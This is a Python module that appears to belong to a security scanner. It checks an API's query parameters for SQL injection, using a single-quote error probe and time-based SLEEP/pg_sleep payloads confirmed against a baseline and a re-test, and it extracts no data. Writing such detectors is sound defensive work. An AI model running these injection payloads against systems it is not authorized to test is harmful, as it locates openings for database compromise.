import re
import time

import httpx

from backend.app.shasec.verifier import register
from backend.app.shasec.verifier._spec import fetch_spec, fill_path, get_endpoints, origin, query_params
from backend.app.shasec.verifier.base import ExploitContext, ExploitModule, ExploitResult
from backend.common.enums import FindingSeverity
from backend.common.log import log

# Signatures that betray a database error reflected to the client (error-based).
_SQL_ERRORS = re.compile(
    r'(SQL syntax|psycopg2|sqlite3\.|OperationalError|ORA-\d{5}|SQLSTATE|'
    r'mysql_fetch|unterminated quoted string|quoted string not properly terminated|'
    r'PG::SyntaxError|ODBC SQL|syntax error at or near)',
    re.I,
)
_ERROR_PAYLOAD = "'"
# Time-based confirmation: a single bounded delay, no data extraction.
_SLEEP_SECONDS = 4
_TIME_PAYLOADS = (
    "1' AND SLEEP(4)-- -",
    "1'||pg_sleep(4)-- -",
    "1) AND SLEEP(4)-- -",
)
_MAX_TARGETS = 25


class SqliModule(ExploitModule):
    """Bounded SQL-injection check: error-based (safe) + time-based confirmation.

    Never extracts or modifies data — it proves the injection point exists and
    stops there.
    """

    name = 'sqli'
    category = 'sql-injection'
    handles = ('api', 'website', 'graphql')
    timeout = 180

    async def run(self, ctx: ExploitContext) -> list[ExploitResult]:
        results: list[ExploitResult] = []
        headers = {'Authorization': f'Bearer {ctx.auth_token}'} if ctx.auth_token else {}
        async with httpx.AsyncClient(timeout=15, follow_redirects=True, headers=headers) as client:
            spec = await fetch_spec(client, origin(ctx.target_url))
            if not spec:
                return results

            targets = []
            for path, _method, op in get_endpoints(spec):
                for param in query_params(op):
                    targets.append((path, param))
                    if len(targets) >= _MAX_TARGETS:
                        break
                if len(targets) >= _MAX_TARGETS:
                    break

            org = origin(ctx.target_url)
            for path, param in targets:
                url = f'{org}{fill_path(path)}'
                # --- error-based (safe) ---
                try:
                    r = await client.get(url, params={param: _ERROR_PAYLOAD})
                except httpx.HTTPError:
                    continue
                log.info(f'[exploit:sqli] scan {ctx.scan_id} {url}?{param}=\' -> {r.status_code}')
                if _SQL_ERRORS.search(r.text):
                    results.append(
                        ExploitResult(
                            category=self.category,
                            title=f'SQL injection (error-based) in `{param}` at {path}',
                            severity=FindingSeverity.critical.value,
                            confirmed=True,
                            impact='A single quote triggers a database error — the parameter reaches SQL unsanitized.',
                            request=f"GET {url}?{param}='",
                            response=f'HTTP {r.status_code}\n{r.text[:300]}',
                        )
                    )
                    continue  # already proven for this param

                # An endpoint that rejects us before any query runs (auth/throttle)
                # cannot be tested blind — a slow 401/429 is NOT SQLi (false positive
                # we hit on a real prod target whose rate-limiter added the delay).
                if r.status_code in (401, 403, 429) or r.status_code >= 500:
                    continue

                # --- time-based confirmation: status-guarded, baselined, reproduced ---
                base = await self._timed(client, url, param, '1')  # benign control
                if base is None or base[1] in (401, 403, 429) or base[1] >= 500:
                    continue
                base_elapsed = base[0]
                for payload in _TIME_PAYLOADS:
                    hit = await self._timed(client, url, param, payload)
                    if hit is None:
                        continue
                    elapsed, status = hit
                    # The injected request must (1) actually execute (not be rejected),
                    # (2) be ~SLEEP slower than the baseline (not just slow in absolute),
                    if status in (401, 403, 429) or status >= 500:
                        continue
                    if elapsed < _SLEEP_SECONDS - 0.5 or (elapsed - base_elapsed) < _SLEEP_SECONDS - 1.5:
                        continue
                    # (3) reproduce: control stays fast, the sleep payload stays slow —
                    # rules out a one-off latency spike / rate-limit blip.
                    ctrl = await self._timed(client, url, param, '1')
                    rep = await self._timed(client, url, param, payload)
                    if not (ctrl and rep):
                        break
                    if (ctrl[0] < _SLEEP_SECONDS - 1.5 and rep[0] >= _SLEEP_SECONDS - 0.5
                            and rep[1] not in (401, 403, 429) and rep[1] < 500):
                        results.append(
                            ExploitResult(
                                category=self.category,
                                title=f'SQL injection (time-based) in `{param}` at {path}',
                                severity=FindingSeverity.critical.value,
                                confirmed=True,
                                impact=(f'Injected SLEEP delayed the response by {elapsed:.1f}s '
                                        f'(baseline {base_elapsed:.1f}s), reproduced — blind SQLi.'),
                                request=f'GET {url}?{param}={payload}',
                                response=(f'HTTP {status} in {elapsed:.1f}s vs baseline HTTP {base[1]} '
                                          f'in {base_elapsed:.1f}s (confirmed on re-test)'),
                            )
                        )
                    break
        return results

    @staticmethod
    async def _timed(client: httpx.AsyncClient, url: str, param: str, value: str):
        """One timed GET → (elapsed_seconds, status_code), or None on transport error."""
        try:
            t0 = time.monotonic()
            r = await client.get(url, params={param: value}, timeout=15)
            return time.monotonic() - t0, r.status_code
        except httpx.HTTPError:
            return None


register(SqliModule())
